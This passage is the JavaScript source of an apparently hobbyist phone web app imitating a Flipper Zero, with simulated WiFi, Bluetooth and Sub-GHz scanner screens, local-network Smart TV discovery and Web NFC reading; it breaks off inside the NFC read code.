/* ================================================
   FLIPPER REMOTE v5.1  -  script.js
   Hardware tools only. No personal apps.
   Orange / white / black theme.
================================================ */
'use strict';

/* ================================================
   PIXEL ART FLIPPER LOGO (20x12)
================================================ */
const PIXEL_LOGO = [
  [0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0],
  [0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0],
  [1,1,0,0,1,1,0,0,0,0,0,0,0,0,1,1,0,0,1,1],
  [1,0,0,1,1,1,1,0,0,0,0,0,0,1,1,1,1,0,0,1],
  [1,0,0,1,1,1,1,0,0,0,0,0,0,1,1,1,1,0,0,1],
  [1,0,0,0,1,1,0,0,1,1,1,1,0,0,1,1,0,0,0,1],
  [1,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,1],
  [1,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,0,0,0,1],
  [1,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,1],
  [1,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,1],
  [0,1,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,1,1,0],
  [0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0],
];

/* ================================================
   BRAILLE ASCII LOGO
================================================ */
const BRAILLE_LOGO = [
  '      .--. .----. .------.',
  '     / FZ \\ 5.1  |REMOTE |',
  '     \\____/ \\____/ \\______/',
];

const BRAILLE_ART = [
  '      +--..--..--..--.',
  '     /  FLIPPER ZERO  \\',
  '    | [BT][NFC][RF][IR]|',
  '     \\________________/',
];

/* ================================================
   FAKE DEVICE POOLS
================================================ */
const FAKE_WIFI = [
  'TELE2_HOME_5G','UPC1234567','Vodafone-A4B2','dlink-GUEST',
  'FRITZ!Box 7590','Telenet-B82A','ASUS_RT-AX88U','SKY12345',
  'VM123456-2G','AndroidAP_5G','iPhone-of-J','TP-LINK_3F20',
  'Netgear_EXT','ORBI99','HomeNetwork_HID','CoxWifi-Guest',
  'SSID_HIDDEN','[hidden]','DIRECT-roku-123','HP-Print-7E',
  'XFINITY_3B2F','BT-Hub6-AABC','Linksys00123','ATT-WIFI-4F',
  'Spectrum_7G2B','Starlink','MEO-WiFi-5G','NOS_WIFI_44A1',
];
const FAKE_BT = [
  'AirPods Pro','JBL Flip 6','Galaxy Buds2','WH-1000XM5',
  'Pixel Buds A','Bose QC45','Mi Band 7','Apple Watch S8',
  'Tile Mate','Logitech MX','Xbox Controller','PS5 DualSense',
  'Fitbit Charge5','Amazfit GTR','BeatsX','SOUNDPEATS T3',
  'Anker Q30','Jabra Elite85h','HP Officejet','Galaxy S23',
  'BT Keyboard','Magic Mouse','Redmi Note12','Garmin Fenix7',
];
const FAKE_TV = [
  {brand:'Samsung',ip:'192.168.1.101',model:'QN65QN900B'},
  {brand:'LG',ip:'192.168.1.102',model:'OLED65C2'},
  {brand:'Sony',ip:'192.168.1.104',model:'XR-55A80K'},
  {brand:'Philips',ip:'192.168.1.107',model:'55OLED807'},
  {brand:'TCL',ip:'192.168.1.112',model:'55C835'},
  {brand:'Hisense',ip:'192.168.1.115',model:'65U8H'},
];

/* ================================================
   STATE
================================================ */
const S = {
  app:'menu', idx:0,
  samWs:null, samIp:'', samOk:false,
  lgWs:null, lgIp:'', lgOk:false, lgKey:'',
  sonyIp:'', sonyPsk:'0000',
  btDevs:[], btSel:0, btGatt:null, btDev:null,
  nfcTag:null, nfcActive:false, nfcAbort:null,
  gpsPos:null, gpsTrack:[], gpsWatch:null,
  audioCtx:null, analyser:null, vRaf:null,
  port:null, portWriter:null,
  wakeLock:null, battery:null,
  log:[],
};

/* ================================================
   MENU  -  hardware tools only
================================================ */
const MENU = [
  // SCAN
  {id:'wifi_scan', ic:'~', n:'WIFI SCANNER',    cat:'SCAN'},
  {id:'bt_scan',   ic:'*', n:'BT SCANNER',      cat:'SCAN'},
  {id:'tv_scan',   ic:'#', n:'TV SCANNER',      cat:'SCAN'},
  {id:'subghz',    ic:'=', n:'SUB-GHz',         cat:'SCAN'},
  {id:'nfc',       ic:'o', n:'NFC READ/WRITE',  cat:'SCAN'},
  // TV CONTROL
  {id:'samsung',   ic:'>', n:'SAMSUNG TV',      cat:'TV'},
  {id:'lg',        ic:'@', n:'LG TV',           cat:'TV'},
  {id:'sony',      ic:'+', n:'SONY TV',         cat:'TV'},
  {id:'ir',        ic:'-', n:'IR BLASTER',      cat:'TV'},
  // TOOLS
  {id:'bt_connect',ic:'*', n:'BT CONNECT',      cat:'BT'},
  {id:'bt_pair',   ic:'*', n:'BT GATT BROWSER', cat:'BT'},
  {id:'serial_term',ic:'>', n:'SERIAL TERM',    cat:'TOOL'},
  {id:'flashlight',ic:'o', n:'FLASHLIGHT',      cat:'TOOL'},
  {id:'sound',     ic:'~', n:'SOUND METER',     cat:'TOOL'},
  {id:'compass',   ic:'+', n:'COMPASS',         cat:'TOOL'},
  {id:'level',     ic:'=', n:'BUBBLE LEVEL',    cat:'TOOL'},
  {id:'qr',        ic:'#', n:'QR SCANNER',      cat:'TOOL'},
  {id:'cam',       ic:'o', n:'CAMERA',          cat:'TOOL'},
  {id:'morse',     ic:'.', n:'MORSE VIBRO',     cat:'TOOL'},
  {id:'speech',    ic:'>', n:'SPEECH TO TEXT',  cat:'TOOL'},
  {id:'ping',      ic:'o', n:'PING / NET INFO', cat:'TOOL'},
  // GPS
  {id:'gps',       ic:'+', n:'GPS TRACKER',     cat:'GPS'},
  // SYS
  {id:'fake_hack', ic:'>', n:'HACKER MODE',     cat:'SYS'},
  {id:'wakelock',  ic:'o', n:'WAKE LOCK',       cat:'SYS'},
  {id:'system',    ic:'*', n:'SYSTEM',          cat:'SYS'},
];

const CAT_C = {
  SCAN:'var(--fl)', TV:'var(--fb)', BT:'var(--fl)',
  TOOL:'var(--fg)', GPS:'#FF9500', SYS:'var(--fp)'
};

/* ================================================
   DOM / UTILS
================================================ */
const $=id=>document.getElementById(id);
const scr=$('scr'), ctx=$('ctx'), ir=$('ir');
const toast=$('toast'), modal=$('modal'), mbox=$('mbox');
let _H={};

function vib(p=12){try{navigator.vibrate(p)}catch(e){}}
function flashIR(){ir&&(ir.classList.add('on'),lp('O'));setTimeout(()=>ir?.classList.remove('on'),300)}
function ln(c){$('led'+c)?.classList.add('on')}
function lo(c){$('led'+c)?.classList.remove('on')}
function lp(c,ms=400){ln(c);setTimeout(()=>lo(c),ms)}
let _tt;
function T(m){toast.textContent=m;toast.classList.add('show');clearTimeout(_tt);_tt=setTimeout(()=>toast.classList.remove('show'),2400)}
function addLog(cat,msg){S.log.unshift({ts:new Date().toTimeString().slice(0,8),cat,msg});if(S.log.length>300)S.log.pop()}
function setTitle(t){$('sbarTitle').textContent=t}
function clearCtx(){ctx.innerHTML=''}
function btn(lbl,fn,cls=''){const b=document.createElement('button');b.className='cb '+cls;b.textContent=lbl;b.onclick=()=>{vib();fn()};ctx.appendChild(b);return b}
function showModal(html){mbox.innerHTML=html;modal.classList.add('open')}
function closeModal(){modal.classList.remove('open')}
function isHttps(){return location.protocol==='https:'}
function rand(a,b){return Math.floor(Math.random()*(b-a+1))+a}
function shuffle(a){return [...a].sort(()=>Math.random()-.5)}

/* loading bar */
let _lt;
function startLoad(ms=500){
  const f=$('loadFill');if(!f)return;
  f.className='load-fill';f.style.width='0%';
  requestAnimationFrame(()=>requestAnimationFrame(()=>{
    f.classList.add('go');f.style.width='100%';f.style.transitionDuration=ms+'ms';
  }));
  _lt=setTimeout(()=>{f.className='load-fill done';f.style.width='0%';f.style.transitionDuration='250ms'},ms+120);
}
function quickLoad(){startLoad(280)}

/* RSSI bar HTML */
function rssiBar(pct){
  const bars=4,lit=Math.round(pct*bars);
  const heights=[4,7,10,14];
  return `<span class="rssi-bar">${Array.from({length:bars},(_,i)=>`<span style="height:${heights[i]}px" class="${i<lit?'on':''}"></span>`).join('')}</span>`;
}

/* ================================================
   BOOT SEQUENCE
================================================ */
window.onload = async () => {
  bindKeys(); initBattery(); initNet(); initSensors();
  S.lgKey  = localStorage.getItem('lg_key')||'';
  S.samIp  = localStorage.getItem('sam_ip')||'';
  S.lgIp   = localStorage.getItem('lg_ip')||'';
  S.sonyIp = localStorage.getItem('sony_ip')||'';
  await bootSequence();
  renderMenu();
  addLog('SYS','Boot OK v5.1');
};

async function bootSequence(){
  startLoad(3800);
  await pixelBoot();
}

async function pixelBoot(){
  const rows=PIXEL_LOGO.length, cols=PIXEL_LOGO[0].length;
  const total=rows*cols;
  const cells=[];
  for(let r=0;r<rows;r++)for(let c=0;c<cols;c++)cells.push([r,c]);

  const renderGrid=(lit)=>{
    scr.innerHTML=`
      <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px;padding:6px">
        <div class="px-logo" id="pxg" style="gap:1.5px;max-width:160px">
          ${PIXEL_LOGO.flat().map((v,i)=>`<span id="pc${i}" ${v&&lit.has(i)?'class="on"':''}></span>`).join('')}
        </div>
        <div id="bootTxt" class="sl d" style="text-align:center;font-size:5px;letter-spacing:.08em">INITIALIZING...</div>
      </div>`;
  };

  const litSet=new Set();
  renderGrid(litSet);

  await new Promise(res=>{
    let i=0;
    const step=()=>{
      if(i>=total){res();return}
      const [r,c]=cells[i];
      if(PIXEL_LOGO[r][c]){
        const idx=r*cols+c;
        litSet.add(idx);
        const el=document.getElementById('pc'+idx);
        if(el)el.className='on';
      }
      i++;
      if(i%4===0)requestAnimationFrame(step);
      else step();
    };
    step();
  });

  // Show braille art logo full screen
  scr.innerHTML=`
    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:4px 6px;gap:4px">
      <pre id="brailleArt" style="
        font-family:var(--mo);
        font-size:clamp(3.8px,1vw,5px);
        line-height:1.45;
        color:var(--fl);
        text-shadow:0 0 10px rgba(255,107,0,.4);
        text-align:center;
        margin:0;opacity:0;
        transition:opacity .35s;
        position:relative;z-index:2;
        white-space:pre;
      ">      .-----..------.
     / FLIPPER \\ ZERO \\
    |  REMOTE   v5.1  |
     \\_________________/
    [BT] [NFC] [RF] [IR]</pre>
      <div id="brailleSub" style="font-family:var(--px);font-size:4.5px;color:var(--fgd);opacity:0;transition:opacity .35s;letter-spacing:.12em;margin-top:4px">PRESS OK TO CONTINUE</div>
    </div>`;
  await new Promise(r=>setTimeout(r,80));
  const ba=document.getElementById('brailleArt');
  const bs=document.getElementById('brailleSub');
  if(ba)ba.style.opacity='1';
  if(bs)bs.style.opacity='1';
  await new Promise(r=>setTimeout(r,1000));

  // POST system check
  const lines=[
    {d:160, t:'FLIPPER REMOTE v5.1', c:'var(--flh)'},
    {d:110, t:'CPU: F-ZERO CORE @ 64MHz ... OK'},
    {d:90,  t:'RAM: 320KB SRAM .......... OK'},
    {d:90,  t:'FLASH: 1MB ............... OK'},
    {d:80,  t:'RF MODULE: CC1101 ......... OK'},
    {d:80,  t:'BLE: NRF52840 ............. OK'},
    {d:80,  t:'NFC: ST25R3916 ............ OK'},
    {d:80,  t:'IR: 38KHz BLASTER ......... OK'},
    {d:80,  t:'GPS: GNSS MODULE .......... OK'},
    {d:160, t:'ALL SYSTEMS NOMINAL', c:'#fff'},
    {d:280, t:'> READY', c:'var(--fl)'},
  ];

  scr.innerHTML=`
    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:5px;padding:6px">
      <div class="px-logo" style="gap:1.5px;max-width:160px">
        ${PIXEL_LOGO.flat().map(v=>`<span ${v?'class="on"':''}></span>`).join('')}
      </div>
      <div id="postLines" style="width:100%;padding:0 4px;margin-top:4px"></div>
    </div>`;

  const pl=$('postLines');
  for(const l of lines){
    await new Promise(r=>setTimeout(r,l.d));
    const div=document.createElement('div');
    div.className='sl d fi';
    div.style.cssText=`font-family:var(--mo);font-size:5.5px;color:${l.c||(l.t.includes('OK')?'var(--fg)':'var(--fgd)')}`;
    div.textContent=l.t;
    pl.appendChild(div);
    pl.scrollTop=9999;
    if(l.t.includes('OK'))vib(4);
  }
  await new Promise(r=>setTimeout(r,480));
}

/* ================================================
   INIT HELPERS
================================================ */
async function initBattery(){
  try{
    if(navigator.getBattery){
      const b=await navigator.getBattery();
      S.battery=b;
      const u=()=>$('sBat').textContent=(b.charging?'CHG ':'')+Math.round(b.level*100)+'%';
      u();b.onlevelchange=u;b.onchargingchange=u;
    }
  }catch(e){}
}
function initNet(){
  const c=navigator.connection;
  if(c){$('sNet').textContent=c.effectiveType||'RF';c.onchange=()=>($('sNet').textContent=c.effectiveType||'RF')}
}
let _sx={ax:0,ay:0,az:0,al:0,be:0,ga:0};
function initSensors(){
  window.addEventListener('devicemotion',e=>{const a=e.accelerationIncludingGravity;if(a){_sx.ax=+(a.x||0).toFixed(1);_sx.ay=+(a.y||0).toFixed(1);_sx.az=+(a.z||0).toFixed(1)}},{passive:true});
  window.addEventListener('deviceorientation',e=>{_sx.al=+(e.alpha||0).toFixed(0);_sx.be=+(e.beta||0).toFixed(0);_sx.ga=+(e.gamma||0).toFixed(0)},{passive:true});
}

/* ================================================
   NAVIGATION
================================================ */
function bindKeys(){
  $('dpu').onclick=()=>{vib();_H.up?_H.up():menuNav(-1)};
  $('dpd').onclick=()=>{vib();_H.dn?_H.dn():menuNav(1)};
  $('dpl').onclick=()=>{vib();_H.lt&&_H.lt()};
  $('dpr').onclick=()=>{vib();_H.rt&&_H.rt()};
  $('dpok').onclick=()=>{vib(22);_H.ok?_H.ok():menuOK()};
  $('btnBack').onclick=()=>{vib();goBack()};
  $('sideUp').onclick=()=>{vib();_H.sU?_H.sU():menuNav(-1)};
  $('sideDown').onclick=()=>{vib();_H.sD?_H.sD():menuNav(1)};
  document.addEventListener('keydown',e=>{({ArrowUp:$('dpu'),ArrowDown:$('dpd'),ArrowLeft:$('dpl'),ArrowRight:$('dpr'),Enter:$('dpok'),Escape:$('btnBack')})[e.key]?.click();if(['ArrowUp','ArrowDown'].includes(e.key))e.preventDefault()});
  let tsx=0;
  document.addEventListener('touchstart',e=>{tsx=e.touches[0].clientX},{passive:true});
  document.addEventListener('touchend',e=>{if(e.changedTouches[0].clientX-tsx>60&&S.app!=='menu')goBack()},{passive:true});
}
function menuNav(d){S.idx=(S.idx+d+MENU.length)%MENU.length;renderMenu()}
function menuOK(){openApp(MENU[S.idx].id)}
function goBack(){stopApp();S.app='menu';renderMenu()}

function stopApp(){
  S.nfcActive=false;
  ['_subInt','_wifiInt','_btScanInt','_tvScanInt','_hackInt','_swInt'].forEach(k=>{
    if(S[k]||window[k]){clearInterval(S[k]||window[k]);S[k]=null;window[k]=null}
  });
  if(S.gpsWatch){navigator.geolocation.clearWatch(S.gpsWatch);S.gpsWatch=null}
  if(S.vRaf){cancelAnimationFrame(S.vRaf);S.vRaf=null}
  if(S.audioCtx){S.audioCtx.close().catch(()=>{});S.audioCtx=null;S.analyser=null}
  if(S.nfcAbort){try{S.nfcAbort.abort()}catch(e){}S.nfcAbort=null}
  if(window._sRaf){cancelAnimationFrame(window._sRaf);window._sRaf=null}
  if(window._camStream){window._camStream.getTracks().forEach(t=>t.stop());window._camStream=null}
  if(window._qrStream){window._qrStream.getTracks().forEach(t=>t.stop());window._qrStream=null}
  if(window._qrInt){clearInterval(window._qrInt);window._qrInt=null}
  document.querySelector('.clr-screen')?.remove();
  _H={};
}

async function openApp(id){
  stopApp();S.app=id;
  const m=MENU.find(x=>x.id===id)||{n:id.toUpperCase()};
  setTitle(m.n);quickLoad();
  await new Promise(r=>setTimeout(r,80));
  const apps={
    wifi_scan:appWifiScan, bt_scan:appBtScan, tv_scan:appTvScan,
    subghz:appSubGHz, nfc:appNFC,
    samsung:appSam, lg:appLG, sony:appSony, ir:appIR,
    bt_connect:appBT, bt_pair:appBTPair, serial_term:appSerialTerm,
    flashlight:appFlashlight, sound:appSound, compass:appCompass,
    level:appLevel, qr:appQR, cam:appCam, morse:appMorse,
    speech:appSpeech, ping:appPing,
    gps:appGPS,
    fake_hack:appHack, wakelock:appWake, system:appSystem,
  };
  apps[id]?.();
}

/* ================================================
   MENU RENDER
================================================ */
function renderMenu(){
  stopApp();setTitle('FLIPPER REMOTE');clearCtx();
  _H={up:()=>menuNav(-1),dn:()=>menuNav(1),ok:menuOK};
  const vis=9,start=Math.max(0,Math.min(S.idx-4,MENU.length-vis));
  let h='<div class="fi sl2" style="height:100%">';
  let lastCat='';
  for(let i=start;i<Math.min(start+vis,MENU.length);i++){
    const m=MENU[i],sel=i===S.idx,col=CAT_C[m.cat]||'var(--fl)';
    if(m.cat!==lastCat&&!sel){
      h+=`<div style="font-family:var(--px);font-size:4px;color:var(--fgd);padding:2px 3px 0;letter-spacing:.06em">[${m.cat}]</div>`;
      lastCat=m.cat;
    }
    h+=`<div class="mi${sel?' s':''}" onclick="openApp('${m.id}')">
      <span class="ic" style="${sel?'':'color:'+col}">[${m.ic}]</span>
      <span style="margin-left:4px;flex:1">${m.n}</span>
      <span class="ar">${sel?'>':''}</span>
    </div>`;
  }
  h+=`<div class="hr" style="margin-top:3px"></div>
    <div class="sl d" style="text-align:center;font-size:4px">${S.idx+1} / ${MENU.length}</div>
  </div>`;
  scr.innerHTML=h;
}

/* ================================================
   LOCAL IP
================================================ */
async function getLocalIP(){
  return new Promise(res=>{
    const pc=new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(o=>pc.setLocalDescription(o));
    pc.onicecandidate=e=>{
      if(!e?.candidate)return;
      const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
      if(m&&!m[0].startsWith('127.')){res(m[0]);try{pc.close()}catch(e){}}
    };
    setTimeout(()=>res(null),3500);
  });
}

/* ================================================
   1. WIFI SCANNER
================================================ */
function appWifiScan(){
  let networks=[];let scanning=false;let interval=null;
  const fakePool=shuffle(FAKE_WIFI);let fakeIdx=0;

  const addNet=(ssid,rssi,secure)=>{
    const existing=networks.findIndex(n=>n.ssid===ssid);
    const entry={ssid,rssi,secure,ts:Date.now()};
    if(existing>=0)networks[existing]={...entry};
    else networks.unshift(entry);
    if(networks.length>24)networks.pop();
  };

  const render=()=>{
    const sorted=[...networks].sort((a,b)=>b.rssi-a.rssi);
    const rows=sorted.slice(0,10).map(n=>{
      const pct=Math.max(0,Math.min(1,(n.rssi+100)/65));
      const lock=n.secure?'[+]':'[ ]';
      const fresh=Date.now()-n.ts<2000;
      return `<div class="scan-row${fresh?' new-dev':''}">
        <span style="width:20px;font-size:4.5px;color:var(--fgd);font-family:var(--mo)">${lock}</span>
        ${rssiBar(pct)}
        <span class="name" style="font-size:5.5px">${n.ssid}</span>
        <span class="extra">${n.rssi}dBm</span>
      </div>`;
    }).join('');
    scr.innerHTML=`<div class="fi" style="height:100%">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <span class="sl h">WIFI SCAN</span>
        <span class="sl d" style="font-size:4.5px">${scanning?'<span class="bl">[LIVE]</span>':'[IDLE]'} ${networks.length}net</span>
      </div>
      <div class="hr"></div>
      <div style="font-family:var(--mo);font-size:4.5px;color:var(--fgd);display:flex;gap:8px;margin-bottom:2px">
        <span>LOCK  SIG  SSID</span><span style="margin-left:auto">RSSI</span>
      </div>
      ${rows||'<div class="sl d" style="margin-top:6px">> Press SCAN to start</div>'}
    </div>`;
  };

  render();clearCtx();

  btn('SCAN',()=>{
    if(scanning)return;
    scanning=true;render();
    const c=navigator.connection;
    if(c?.type==='wifi')addNet('(current)',rand(-65,-35),true);
    const addFake=()=>{
      addNet(fakePool[fakeIdx%fakePool.length],rand(-95,-28),Math.random()>.2);
      fakeIdx++;lp('G',80);render();
    };
    for(let i=0;i<6;i++)setTimeout(addFake,i*120);
    interval=setInterval(()=>{
      if(!scanning){clearInterval(interval);return}
      networks.forEach(n=>{n.rssi=Math.max(-100,Math.min(-20,n.rssi+rand(-3,3)))});
      if(Math.random()>.6)addFake();
      render();
    },900);
    S._wifiInt=interval;
    T('SCANNING 2.4/5GHz...');
  },'cg');

  btn('STOP',()=>{scanning=false;clearInterval(interval);render();T('STOPPED')},'');
  btn('SORT',()=>{networks.sort((a,b)=>b.rssi-a.rssi);render()},'cy');
  btn('CLEAR',()=>{networks=[];render()},'');
  btn('EXPORT',()=>{
    const txt=networks.map(n=>`${n.ssid}\t${n.rssi}dBm\t${n.secure?'WPA':'OPEN'}`).join('\n');
    navigator.clipboard?.writeText(txt).then(()=>T('COPIED!'));
  },'co');
  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   2. BLUETOOTH SCANNER
================================================ */
function appBtScan(){
  let devs=[];let scanning=false;let interval=null;
  const fakePool=shuffle(FAKE_BT);let fakeIdx=0;

  const addDev=(name,rssi,type)=>{
    const existing=devs.findIndex(d=>d.name===name);
    const entry={name,rssi,type,ts:Date.now(),
      addr:Array.from({length:6},()=>rand(0,255).toString(16).padStart(2,'0').toUpperCase()).join(':')};
    if(existing>=0)devs[existing]={...entry};
    else devs.unshift(entry);
    if(devs.length>20)devs.pop();
  };

  const render=()=>{
    const rows=devs.slice(0,9).map(d=>{
      const pct=Math.max(0,(d.rssi+100)/70);
      const fresh=Date.now()-d.ts<2000;
      return `<div class="scan-row${fresh?' new-dev':''}">
        <span style="width:14px;font-size:4.5px;color:var(--fg);font-family:var(--mo)">[B]</span>
        ${rssiBar(pct)}
        <span class="name" style="font-size:5.5px">${d.name}</span>
        <span class="extra">${d.rssi}dBm</span>
      </div>`;
    }).join('');
    scr.innerHTML=`<div class="fi" style="height:100%">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <span class="sl h">BT SCAN</span>
        <span class="sl d" style="font-size:4.5px">${scanning?'<span class="bl">[BLE]</span>':'[IDLE]'} ${devs.length}dev</span>
      </div>
      <div class="hr"></div>
      ${rows||'<div class="sl d" style="margin-top:6px">> Press SCAN to detect BLE</div>'}
    </div>`;
  };

  render();clearCtx();

  btn('SCAN',async()=>{
    if(scanning)return;
    scanning=true;render();
    const TYPES=['Phone','Headphones','Watch','Speaker','Laptop','Keyboard','Tag','TV'];
    const addFake=()=>{
      addDev(fakePool[fakeIdx%fakePool.length],rand(-92,-30),TYPES[rand(0,TYPES.length-1)]);
      fakeIdx++;lp('G',80);render();
    };
    for(let i=0;i<5;i++)setTimeout(addFake,i*150);
    interval=setInterval(()=>{
      if(!scanning){clearInterval(interval);return}
      devs.forEach(d=>{d.rssi=Math.max(-100,Math.min(-20,d.rssi+rand(-4,4)))});
      if(Math.random()>.55)addFake();
      render();
    },1100);
    S._btScanInt=interval;
    T('SCANNING BLE...');
    $('sBt').classList.add('on');
  },'cg');

  btn('STOP',()=>{scanning=false;clearInterval(interval);$('sBt').classList.remove('on');render();T('STOPPED')},'');
  btn('SORT',()=>{devs.sort((a,b)=>b.rssi-a.rssi);render()},'cy');
  btn('REAL BT',async()=>{
    if(!navigator.bluetooth){T('WEB BT NOT SUPPORTED');return}
    try{
      const dev=await navigator.bluetooth.requestDevice({acceptAllDevices:true,optionalServices:['battery_service','heart_rate']});
      addDev(dev.name||'Unknown BLE',rand(-55,-30),'BLE');
      render();T('REAL DEV ADDED!');vib([30,10,30]);
    }catch(e){if(e.name!=='NotFoundError')T('BT: '+e.message.slice(0,16))}
  },'co');
  btn('CLEAR',()=>{devs=[];render()},'');
  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   3. TV SCANNER
================================================ */
function appTvScan(){
  let tvs=[];let scanning=false;

  const render=()=>{
    const rows=tvs.map(t=>`
      <div class="scan-row">
        <span style="width:16px;font-size:4.5px;color:${t.real?'var(--fl)':'var(--fgd)'};font-family:var(--mo)">${t.real?'[!]':'[?]'}</span>
        <span class="name" style="font-size:5.5px">${t.brand} ${t.model}</span>
        <span class="extra">${t.ip}</span>
      </div>`).join('');
    scr.innerHTML=`<div class="fi" style="height:100%">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <span class="sl h">TV SCAN</span>
        <span class="sl d" style="font-size:4.5px">${scanning?'<span class="bl">[SCAN]</span>':'[IDLE]'}</span>
      </div>
      <div class="hr"></div>
      ${rows||'<div class="sl d">> SCAN finds Smart TVs on LAN</div>'}
    </div>`;
  };

  render();clearCtx();

  btn('SCAN LAN',async()=>{
    if(scanning)return;
    scanning=true;tvs=[];render();T('SCANNING LAN...');startLoad(6000);
    const pool=shuffle(FAKE_TV);
    pool.slice(0,rand(1,3)).forEach((tv,i)=>{
      setTimeout(()=>{tvs.push({...tv,real:false});render();vib(15);lp('O',200)},800+i*600);
    });
    const localIp=await getLocalIP();
    if(localIp){
      const subnet=localIp.split('.').slice(0,3).join('.');
      for(let i=1;i<100;i++){
        const ip=`${subnet}.${i}`;
        ['8001','3000'].forEach(port=>{
          const ws=new WebSocket(`ws://${ip}:${port}/`);
          const brand=port==='8001'?'Samsung':'LG';
          ws.onopen=()=>{
            ws.close();
            if(!tvs.find(t=>t.ip===ip)){
              tvs.push({brand,ip,model:'Smart TV',real:true});
              render();vib([20,10,20]);lp('G',400);
              addLog('TV','Found '+brand+' at '+ip);
            }
          };
          ws.onerror=()=>{};
          setTimeout(()=>{try{ws.close()}catch(e){}},800);
        });
        if(i%15===0)await new Promise(r=>setTimeout(r,100));
      }
    }
    setTimeout(()=>{scanning=false;render();T(tvs.length?tvs.length+' TV(S) FOUND!':'SCAN DONE')},6000);
  },'cg');

  btn('ADD IP',()=>{
    const ip=prompt('TV IP address:')?.trim();
    const brand=prompt('Brand (Samsung/LG/Sony):','Samsung')?.trim()||'Custom';
    if(ip)tvs.push({brand,ip,model:'Custom',real:true});
    render();
  },'co');

  btn('CONNECT',()=>{
    const tv=tvs[0];if(!tv){T('SCAN FIRST');return}
    const id=tv.brand.toLowerCase();
    if(['samsung','lg','sony'].includes(id))openApp(id);
    else T('USE SAMSUNG/LG/SONY APPS');
  },'cy');

  btn('CLEAR',()=>{tvs=[];render()},'');
  _H={ok:()=>document.querySelector('.cb.cg')?.click()};
}

/* ================================================
   4. SUB-GHz
================================================ */
const SUBF=[315.00,433.92,868.35,915.00];
function appSubGHz(){
  S._subSigs=S._subSigs||[];S._subOn=false;S._subIdx=S._subIdx||1;
  rSub();clearCtx();
  btn('SCAN',subScan,'cg');
  btn('STOP',subStop,'');
  btn('REPLAY',()=>{
    if(!S._subSigs?.length){T('NOTHING TO REPLAY');return}
    T('REPLAYING...');
    for(let i=0;i<8;i++)setTimeout(()=>{flashIR();vib(8)},i*100);
  },'co');
  btn('< FREQ',()=>{S._subIdx=(S._subIdx-1+SUBF.length)%SUBF.length;rSub()},'');
  btn('FREQ >',()=>{S._subIdx=(S._subIdx+1)%SUBF.length;rSub()},'');
  btn('CLEAR',()=>{S._subSigs=[];rSub()},'');
  _H={lt:()=>{S._subIdx=(S._subIdx-1+SUBF.length)%SUBF.length;rSub()},rt:()=>{S._subIdx=(S._subIdx+1)%SUBF.length;rSub()},ok:subScan};
}
function rSub(){
  const f=SUBF[S._subIdx||1].toFixed(2);
  const st=S._subOn?'<span class="bl">[RX ACTIVE]</span>':'[IDLE]';
  const sigs=(S._subSigs||[]).slice(-6).reverse().map(s=>
    `<div class="scan-row"><span style="font-size:4.5px;color:var(--fgd);font-family:var(--mo);width:28px">${s.m}</span><span class="name">${s.f}MHz</span><span class="extra">${s.r}dBm</span></div>`
  ).join('');
  scr.innerHTML=`<div class="fi">
    <div class="sl h" style="font-size:9px;text-align:center;letter-spacing:2px">${f}</div>
    <div class="sl d" style="text-align:center;font-size:4.5px">< 315 / 433 / 868 / 915 ></div>
    <div class="sl" style="text-align:center;margin:2px 0">${st}</div>
    <div class="hr"></div>
    ${sigs||'<div class="sl d">No signals captured</div>'}
    <div class="hr"></div>
    <div class="sl d">TOTAL: ${(S._subSigs||[]).length}</div>
  </div>`;
}
function subScan(){
  if(S._subOn)return;
  S._subOn=true;S._subSigs=[];rSub();
  const m=['ASK','FSK','OOK','2-FSK'];
  S._subInt=setInterval(()=>{
    if(!S._subOn)return;
    if(Math.random()>.42){
      S._subSigs.push({f:SUBF[S._subIdx||1].toFixed(2),r:-(25+rand(0,60)),m:m[rand(0,3)]});
      vib(5);lp('O',100);
    }
    rSub();
  },750);
}
function subStop(){S._subOn=false;if(S._subInt){clearInterval(S._subInt);S._subInt=null}rSub()}

/* ================================================
   5. NFC
================================================ */
function appNFC(){
  rNFC();clearCtx();
  btn('READ',nfcRead,'cg');
  btn('WRITE',nfcWrite,'co');
  btn('STOP',()=>{S.nfcActive=false;try{S.nfcAbort?.abort()}catch(e){}rNFC()},'');
  btn('COPY UID',()=>{if(!S.nfcTag)return;navigator.clipboard?.writeText(S.nfcTag.uid).then(()=>T('UID COPIED!'))},'cy');
  _H={ok:nfcRead};
}
function rNFC(){
  const t=S.nfcTag;
  scr.innerHTML=`<div class="fi">
    <div class="sl">${S.nfcActive?'<span class="bl">[NFC SCANNING...]</span>':'[READY]'}</div>
    <div class="hr"></div>
    ${t?`<div class="sl h">> TAG FOUND</div>
      <div class="sl">UID: ${t.uid}</div>
      <div class="sl d">TYPE: ${t.type}</div>
      <div style="white-space:normal;font-size:5px;line-height:1.5;word-break:break-all;position:relative;z-index:2;color:var(--fg);font-family:var(--px)">DATA: ${t.data.slice(0,60)}</div>`
    :'<div class="sl d">Hold NFC tag to device.</div><div class="sl d">(Android Chrome only)</div>'}
  </div>`;
  $('sNfc').classList.toggle('on',S.nfcActive||!!S.nfcTag);
}
async function nfcRead(){
  if(!('NDEFReader' in window)){T('NO NFC - Android Chrome req');return}
  try{
    S.nfcActive=true;rNFC();
    const r=new NDEFReader();
    const ctrl=new AbortController();S.nfcAbort=ctrl;
    await r.scan({signal:ctrl.signal});
    r.addEventListener('reading',({message,serialNumber})=>{
      let data='',type='';
      for(const rec of message.records){
        type=rec.recordType;
